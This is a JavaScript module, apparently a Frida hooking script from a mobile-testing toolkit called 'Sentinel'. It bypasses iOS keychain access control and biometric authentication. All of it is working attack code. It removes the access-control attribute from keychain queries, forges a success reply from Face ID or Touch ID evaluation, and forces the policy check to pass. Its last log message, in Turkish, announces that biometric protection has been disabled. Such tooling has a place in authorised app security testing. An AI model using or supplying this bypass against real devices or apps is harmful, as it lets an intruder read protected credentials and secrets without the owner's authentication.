/**
 * Sentinel Phase 8 — Task 8.4.x
 * Keychain & Access Control (ACL) Bypass
 * 
 * Intercepts SecItemCopyMatching to strip kSecAttrAccessControl 
 * and forks LAContext async reply blocks for simulated biometrics.
 */

"use strict";

const KeychainHookConfig = {
  logQueries: true,
  patchLAContext: true,
  stripAuthAttributes: true,
};

function _getNative(module, name, ret, args) {
  const addr = Module.findExportByName(module, name) || Module.findExportByName(null, name);
  if (!addr) return null;
  return new NativeFunction(addr, ret, args);
}

let _kAttrAccessControl = null;

function _getKSecAttrAccessControl() {
  if (_kAttrAccessControl === null) {
     const ptr = Module.findExportByName("Security", "kSecAttrAccessControl") || Module.findExportByName(null, "kSecAttrAccessControl");
     if (ptr) _kAttrAccessControl = ptr.readPointer();
  }
  return _kAttrAccessControl;
}

function _hookSecItemCopyMatching() {
  const addr = Module.findExportByName("Security", "SecItemCopyMatching") || Module.findExportByName(null, "SecItemCopyMatching");
  if (!addr) return;

  const CFDictionaryGetValue = _getNative("CoreFoundation", "CFDictionaryGetValue", "pointer", ["pointer", "pointer"]);
  const CFDictionaryCreateMutableCopy = _getNative("CoreFoundation", "CFDictionaryCreateMutableCopy", "pointer", ["pointer", "long", "pointer"]);
  const CFDictionaryRemoveValue = _getNative("CoreFoundation", "CFDictionaryRemoveValue", "void", ["pointer", "pointer"]);
  const CFRelease = _getNative("CoreFoundation", "CFRelease", "void", ["pointer"]);

  if (!CFDictionaryGetValue || !CFDictionaryCreateMutableCopy || !CFDictionaryRemoveValue || !CFRelease) {
    console.log("[Sentinel][Keychain] Critical error: CoreFoundation exports not found. Skipping bypass.");
    return;
  }

  Interceptor.attach(addr, {
    onEnter(args) {
      if (!KeychainHookConfig.stripAuthAttributes) return;

      const query = args[0];
      const kACL = _getKSecAttrAccessControl();
      if (!kACL) return;

      const valACL = CFDictionaryGetValue(query, kACL);
      if (valACL && !valACL.isNull()) {
        const mutableQ = CFDictionaryCreateMutableCopy(NULL, 0, query);
        CFDictionaryRemoveValue(mutableQ, kACL);
        
        this.patchedQuery = mutableQ;
        args[0] = mutableQ;
        
        if (KeychainHookConfig.logQueries) console.log("[Sentinel][Keychain] ACL stripped from query.");
      }
    },
    onLeave() {
      if (this.patchedQuery && !this.patchedQuery.isNull()) {
        CFRelease(this.patchedQuery);
        this.patchedQuery = null;
      }
    }
  });
}

function _hookLAContext() {
  if (!KeychainHookConfig.patchLAContext) return;

  const LAContext = ObjC.classes.LAContext;
  if (!LAContext) return;

  const evalAsyncSel = "evaluatePolicy:localizedReason:reply:";
  if (LAContext.respondsToSelector_(ObjC.selector(evalAsyncSel))) {
    Interceptor.attach(LAContext["- evaluatePolicy:localizedReason:reply:"].implementation, {
      onEnter(args) {
        const originalBlock = new ObjC.Block(args[4]);
        const replacedBlock = new ObjC.Block({
          retType: "void",
          argTypes: ["bool", "object"],
          implementation(success, _error) {
            console.log("[Sentinel][Keychain] LAContext async reply → forging success=YES");
            originalBlock.implementation(true, NULL);
          }
        });
        args[4] = replacedBlock;
      }
    });
  }

  Interceptor.attach(LAContext["- canEvaluatePolicy:error:"].implementation, {
    onLeave(retval) { retval.replace(ptr(1)); }
  });
}

function attachKeychainHook() {
  _hookSecItemCopyMatching();
  _hookLAContext();
  console.log("[Sentinel][Keychain] Biyometrik erişim kalkanı devre dışı bırakıldı.");
}

module.exports = { attachKeychainHook, KeychainHookConfig };
